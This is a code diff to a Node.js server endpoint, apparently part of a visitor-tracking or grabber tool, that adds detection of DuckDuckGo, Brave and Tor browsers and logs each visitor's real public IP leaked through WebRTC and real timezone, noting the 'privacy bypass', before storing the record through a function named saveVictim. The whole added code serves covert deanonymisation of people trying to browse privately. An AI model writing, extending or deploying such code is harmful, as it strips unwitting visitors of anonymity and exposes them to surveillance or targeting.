@@ -549,6 +549,44 @@ app.post('/api/capture', async (req, res) => {
                              userAgent.includes('PhantomJS') ||
                              (data.browser?.plugins && data.browser.plugins.length === 0 && !isMobile);
 
+    // 🦆 DETECTAR NAVEGADORES DE PRIVACIDAD
+    if (!data.privacyBrowser) {
+      data.privacyBrowser = {
+        isDuckDuckGo: userAgent.includes('DuckDuckGo') || userAgent.includes('ddg'),
+        isBrave: userAgent.includes('Brave'),
+        isTor: userAgent.includes('Tor'),
+        privacyFeatures: [],
+        antiTrackingScore: 0
+      };
+
+      // Calcular score basado en características detectadas
+      if (data.privacyBrowser.isDuckDuckGo) {
+        data.privacyBrowser.privacyFeatures.push('DuckDuckGo Browser');
+        data.privacyBrowser.antiTrackingScore += 30;
+      }
+      if (data.privacyBrowser.isBrave) {
+        data.privacyBrowser.privacyFeatures.push('Brave Browser');
+        data.privacyBrowser.antiTrackingScore += 35;
+      }
+      if (data.privacyBrowser.isTor) {
+        data.privacyBrowser.privacyFeatures.push('Tor Browser');
+        data.privacyBrowser.antiTrackingScore += 50;
+      }
+    }
+
+    // Log especial para navegadores de privacidad
+    if (data.privacyBrowser?.isDuckDuckGo || data.privacyBrowser?.isBrave || data.privacyBrowser?.isTor) {
+      console.log(`🦆 Navegador de privacidad detectado: ${data.privacyBrowser.privacyFeatures.join(', ')}`);
+      console.log(`   📊 Anti-Tracking Score: ${data.privacyBrowser.antiTrackingScore}/100`);
+
+      if (data.webRTC?.publicIP && data.webRTC.publicIP !== 'Unknown' && data.webRTC.publicIP !== 'Error') {
+        console.log(`   🌐 WebRTC IP capturada: ${data.webRTC.publicIP} (bypass privacidad)`);
+      }
+      if (data.timezoneInfo?.timezone) {
+        console.log(`   🕐 Timezone real: ${data.timezoneInfo.timezone}`);
+      }
+    }
+
     // Guardar en MongoDB
     const saved = await saveVictim(data);
     
